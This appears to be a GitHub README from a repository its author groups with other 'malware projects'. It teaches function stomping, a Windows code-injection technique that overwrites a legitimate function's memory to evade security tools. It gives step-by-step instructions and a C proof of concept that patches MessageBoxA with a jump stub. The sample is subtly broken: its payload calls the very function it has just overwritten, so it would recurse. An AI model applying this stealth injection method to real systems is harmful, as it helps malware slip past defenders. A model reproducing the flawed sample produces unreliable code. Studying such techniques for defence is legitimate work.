# Function Stomping Injection

## [![Typing SVG](https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=2000&pause=1000&width=435&lines=Welcome+to+Function+Stomping+Injection+Repo!!!;Check+my+Repos+for+more+malware+projects;Exploring+advanced+injection+techniques;Educational+purposes+only!)](https://git.io/typing-svg)

## Overview

Function stomping is an advanced code injection technique used to modify the behavior of a program by overwriting the memory of a legitimate function with custom code. This approach avoids creating new executable memory, making it stealthier compared to traditional methods that use APIs like `VirtualAlloc` or `VirtualAllocEx`.

The goal of this repository is to provide practical examples of this technique for educational purposes and help researchers and security professionals understand its mechanics.

## Table of Contents

- [Overview](#overview)
- [How It Works](#how-it-works)
- [Why Use Function Stomping?](#why-use-function-stomping)
- [Steps to Implement](#steps-to-implement)
- [Example Code](#example-code)
- [Precautions](#precautions)
- [Disclaimer](#disclaimer)
- [References](#references)

## How It Works

The process of function stomping can be summarized as follows:

1. **Identify a Sacrificial Function**:
   - Locate an existing function in the target process (e.g., functions in system libraries such as `kernel32.dll` or `ntdll.dll`).

2. **Overwrite the Function's Memory**:
   - Modify the memory where the function resides to replace its original logic with custom malicious code.

3. **Execute Malicious Code**:
   - When the overwritten function is called, it executes the custom code instead of its original behavior.

4. **(Optional) Restore Functionality**:
   - If stealth is critical, the original function can be restored after execution to avoid detection.

## Why Use Function Stomping?

Function stomping is a stealthy technique because it:
- **Avoids Allocating New Memory**: No new executable memory is allocated, reducing the chances of detection by security tools.
- **Uses Existing Code Locations**: Overwrites existing memory regions, blending into the program's normal memory layout.

## Steps to Implement

1. **Find the Target Function:**
   - Use tools like `GetProcAddress` or debugging utilities to locate the memory address of a function.

2. **Change Memory Permissions:**
   - Modify the memory region's permissions (e.g., using `VirtualProtect`) to make it writable and executable if necessary.

3. **Overwrite the Function:**
   - Replace the function's instructions with your custom shellcode or a jump to your payload.

4. **Trigger Execution:**
   - Call the modified function or trigger it indirectly, causing the malicious code to execute.

## Example Code

Below is a simple example of function stomping in C:

```c
#include <windows.h>
#include <stdio.h>

void payload() {
    MessageBoxA(NULL, "Hello from the payload!", "Function Stomping", MB_OK);
}

int main() {
    // Identify the sacrificial function (e.g., MessageBoxA)
    FARPROC targetFunc = GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
    if (!targetFunc) {
        printf("Failed to locate target function.\n");
        return -1;
    }

    // Change memory permissions to writable
    DWORD oldProtect;
    if (!VirtualProtect(targetFunc, 4096, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory permissions.\n");
        return -1;
    }

    // Overwrite the target function with a JMP to our payload
    unsigned char jmp[] = {
        0x48, 0xB8,                           // MOV RAX, address
        (unsigned char)((uintptr_t)payload & 0xFF),
        (unsigned char)(((uintptr_t)payload >> 8) & 0xFF),
        (unsigned char)(((uintptr_t)payload >> 16) & 0xFF),
        (unsigned char)(((uintptr_t)payload >> 24) & 0xFF),
        (unsigned char)(((uintptr_t)payload >> 32) & 0xFF),
        (unsigned char)(((uintptr_t)payload >> 40) & 0xFF),
        (unsigned char)(((uintptr_t)payload >> 48) & 0xFF),
        (unsigned char)(((uintptr_t)payload >> 56) & 0xFF),
        0xFF, 0xE0                            // JMP RAX
    };

    memcpy(targetFunc, jmp, sizeof(jmp));

    // Restore original permissions
    VirtualProtect(targetFunc, 4096, oldProtect, &oldProtect);

    // Trigger the overwritten function
    MessageBoxA(NULL, "This should run the payload.", "Test", MB_OK);

    return 0;
}
```

## Precautions

- **Stability**: Overwriting critical functions may crash the application if not done carefully.
- **Detection**: While stealthy, this technique can still be detected by advanced security tools or monitored memory regions.

## Disclaimer

This repository is for educational purposes only. The use of these techniques in unauthorized or malicious contexts is strictly prohibited and may violate laws.

## References
- [Windows API Documentation](https://learn.microsoft.com/en-us/windows/win32/api/)
- [Reverse Engineering Techniques](https://reverseengineering.stackexchange.com/)
